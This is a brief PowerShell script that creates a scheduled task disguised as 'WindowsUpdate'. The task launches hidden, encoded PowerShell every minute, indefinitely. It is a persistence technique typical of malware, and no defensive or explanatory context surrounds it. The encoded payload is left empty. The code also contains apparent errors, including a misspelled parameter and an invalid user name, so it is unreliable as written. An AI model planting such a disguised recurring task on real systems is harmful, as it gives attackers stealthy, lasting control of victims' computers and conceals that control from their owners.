$Trigger= New-ScheduledTaskTrigger -Once -At $(get-date) -RepititionInterval $([timespan]::FromMinutes("1")) -RepeatIndefinitely # Specify the trigger settings
$User= "NT manager"
$Action= New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-noP -sta -w 1 -enc  " 
Register-ScheduledTask -TaskName "WindowsUpdate" -Trigger $Trigger -User $User -Action $Action
